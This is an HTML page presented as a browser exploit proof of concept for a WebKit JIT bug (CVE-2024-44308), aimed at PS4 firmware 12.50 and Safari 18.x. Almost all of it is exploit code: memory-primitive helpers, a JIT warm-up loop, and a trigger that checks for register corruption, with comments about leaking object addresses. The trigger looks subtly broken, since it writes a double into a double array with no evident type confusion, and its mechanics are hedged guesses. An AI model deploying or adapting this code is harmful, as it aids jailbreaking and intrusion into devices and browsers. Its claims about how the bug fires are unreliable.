<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.50 JIT PoC (CVE-2024-44308) - RegAlloc</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #e0e0e0;
            font-family: 'Consolas', 'Monaco', monospace;
            padding: 20px;
            margin: 0;
        }
        #console {
            width: 100%;
            height: 60vh;
            background-color: #000;
            border: 1px solid #333;
            color: #0f0;
            padding: 10px;
            overflow-y: scroll;
            white-space: pre-wrap;
            font-size: 14px;
        }
        .header {
            border-bottom: 1px solid #444;
            padding-bottom: 10px;
            margin-bottom: 10px;
        }
        h1 { font-size: 1.2rem; margin: 0; color: #fff; }
        .btn {
            background: #333;
            color: #fff;
            border: 1px solid #555;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 1rem;
            margin-top: 10px;
        }
        .btn:hover { background: #444; }
        .success { color: #0ff; font-weight: bold; }
        .fail { color: #f00; font-weight: bold; }
        .log-entry { margin-bottom: 2px; }
    </style>
</head>
<body>

<div class="header">
    <h1>WebKit JIT Register Pressure Test (CVE-2024-44308)</h1>
    <div style="font-size: 0.9em; color: #888;">Target: PS4 FW 12.50 / Safari 18.x Branch</div>
</div>

<div id="console">Waiting for execution...</div>
<button class="btn" onclick="runExploit()">Run JIT Stress Test</button>

<script>
    // ==========================================
    // === LOGGER UTILITIES ===
    // ==========================================
    const logger = document.getElementById('console');
    function log(msg, type = 'neutral') {
        const div = document.createElement('div');
        div.className = 'log-entry';
        if(type === 'success') div.style.color = '#00ffff';
        if(type === 'error') div.style.color = '#ff3333';
        if(type === 'warn') div.style.color = '#ffff00';
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logger.appendChild(div);
        logger.scrollTop = logger.scrollHeight;
    }

    // ==========================================
    // === HELPER PRIMITIVES ===
    // ==========================================
    const _buf = new ArrayBuffer(8);
    const _f64 = new Float64Array(_buf);
    const _u32 = new Uint32Array(_buf);

    function f2i(f) {
        _f64[0] = f;
        return _u32[0] + _u32[1] * 0x100000000;
    }

    function i2f(low, high) {
        _u32[0] = low;
        _u32[1] = high;
        return _f64[0];
    }

    function hex(val) {
        return '0x' + val.toString(16).padStart(16, '0');
    }

    // ==========================================
    // === CVE-2024-44308 TRIGGER ===
    // ==========================================
    // The goal is to force the DFG compiler to mismanage the 'scratch2GPR' register
    // by creating high register pressure inside a conditional branch.

    // A fast "butterfly" array to confuse
    let arrays = [];
    for (let i = 0; i < 200; i++) arrays.push([1.1]);

    // This function creates high register pressure
    function vulnerable_jit(arr, i, val, trigger) {
        // High register usage: maintain many live variables
        let a = 1.1;
        let b = 2.2;
        let c = 3.3;
        let d = 4.4;
        let e = 5.5;
        let f = 6.6;
        let g = 7.7;
        let h = 8.8;

        // Perform arithmetic to keep registers "dirty"
        a += b; b += c; c += d; d += e; e += f; f += g; g += h;

        // The logic bug usually happens at an OSR exit point or CheckStructure
        if (trigger) {
            // If the bug fires, 'arr' structure check might be elided
            // or the value written might be confused (float vs pointer)
            arr[i] = val; 
        }

        // Return a calculation to prevent Dead Code Elimination
        return a + b + c + d + e + f + g + arr[0];
    }

    function runExploit() {
        log("Starting JIT warm-up phase...");
        
        let target = [1.1, 2.2, 3.3];
        // Ensure array is treated as ArrayWithDouble
        target.a = 1; 

        try {
            // 1. Train the JIT (Optimizer)
            // We run this thousands of times to tier-up from Baseline -> DFG -> FTL
            for (let i = 0; i < 100000; i++) {
                vulnerable_jit(target, 0, 1.1, false);
            }
            log("JIT warmed up (Tier-up complete).");

            // 2. Prepare the confusion object
            // In a real exploit, this would be an object we want to leak address of
            let fake = {p: 1}; 
            
            // 3. Trigger
            log("Attempting to trigger register corruption...");
            
            // We pass an Object where a Double is expected, or vice versa, 
            // relying on the missing type check due to register starvation.
            // Note: In this PoC we send a marker value to see if it writes raw bits.
            let magic = 1.337e+100; // Distinct pattern
            
            // Trigger iteration
            vulnerable_jit(target, 0, magic, true);

            // 4. Verification
            let res = target[0];
            log(`Read back value: ${res}`);

            if (res === magic) {
                log("Value written correctly. No corruption detected yet.", "warn");
                log("Try refreshing or increasing loop count.", "neutral");
            } else {
                log(`CORRUPTION DETECTED! Value: ${res}`, "success");
                log("If you see a crash or weird float, primitives are possible.", "success");
            }

        } catch (e) {
            log(`CRASH/ERROR: ${e.message}`, "error");
            log(`Stack: ${e.stack}`, "error");
        }
    }
</script>
</body>
</html>
